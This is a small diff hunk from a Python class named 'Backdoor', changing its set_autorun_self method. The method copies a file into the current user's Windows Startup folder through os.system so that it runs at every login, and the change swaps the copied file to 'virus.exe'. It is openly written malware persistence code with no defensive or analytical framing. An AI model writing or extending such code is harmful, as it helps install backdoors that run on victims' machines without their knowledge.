@@ -112,7 +112,7 @@ class Backdoor:
 	def set_autorun_self(self):
 		username = os.getlogin()
 		startup_path = f"C:\\Users\\{username}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
-		command = f'copy "try.py" "{startup_path}\\try.py"'
+		command = f'copy "virus.exe" "{startup_path}\\try.py"'
 		print(command)
 		os.system(command)
 
